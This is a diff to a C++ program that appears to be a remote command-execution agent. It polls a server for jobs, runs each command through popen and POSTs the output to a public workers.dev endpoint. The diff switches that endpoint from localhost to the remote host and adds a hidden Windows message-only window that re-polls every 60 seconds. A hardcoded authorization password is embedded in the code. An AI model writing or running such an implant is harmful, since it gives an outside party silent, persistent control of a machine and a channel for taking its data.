@@ -7,6 +7,9 @@
 #include <memory>
 #include <stdexcept>
 #include <array>
+#include <windows.h>
+//#include <thread>
+//#include <chrono>
 
 static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
 {
@@ -26,8 +29,8 @@ int SendResultsToWorker(int jobId, Result res){
     curl = curl_easy_init();
     if(curl) {
       curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
-      curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8787/api/send-results-to-worker");//"https://cleopatra.etcetra7n.workers.dev/api/send-results-to-worker"
-      //curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+      curl_easy_setopt(curl, CURLOPT_URL, "https://cleopatra.etcetra7n.workers.dev/api/send-results-to-worker");
+      curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
       curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
       struct curl_slist *headers = NULL;
       headers = curl_slist_append(headers, "Authorization:Taurus:ThisIsTaurusPassword");
@@ -48,6 +51,7 @@ int SendResultsToWorker(int jobId, Result res){
       curl_slist_free_all(headers);
     }
     curl_easy_cleanup(curl);
+    //std::cout << "result sent to worker" << std::endl;
     return 0;
 }
 Result exec(const char* cmd) {
@@ -63,7 +67,9 @@ Result exec(const char* cmd) {
     res.exitcode = pclose(pipe);
     return res;
 }
-int CronJob(){
+
+//void CronJob(){
+void CALLBACK CronJob(HWND, UINT, UINT_PTR, DWORD){
   CURL *curl;
   CURLcode curlRes;
   std::string readBuffer;
@@ -80,7 +86,7 @@ int CronJob(){
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
     curlRes = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
-    //std::cout << readBuffer << std::endl;
+    //std::cout <<"job recieved: "<< readBuffer << std::endl;
     
     rapidjson::StringStream json_stream(readBuffer.c_str());
     rapidjson::Document result; 
@@ -92,11 +98,29 @@ int CronJob(){
         SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res);
     }
   }
-  return 0;
 }
 
 int main(void)
 {
-  CronJob();
-  return 0;
+    HWND hwnd = CreateWindowEx(0, "STATIC", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);
+    
+    UINT_PTR timerId = SetTimer(hwnd, 1, 60000, CronJob); //60 seconds
+    if (!timerId) {
+        std::cerr << "Failed to create timer.\n";
+        return 1;
+    }
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    KillTimer(hwnd, timerId);
+    /*
+    while (true) {
+        CronJob();  // Call the function
+        std::this_thread::sleep_for(std::chrono::seconds(30)); // Sleep for 1 minute
+    }
+    */
+    return 0;
 }
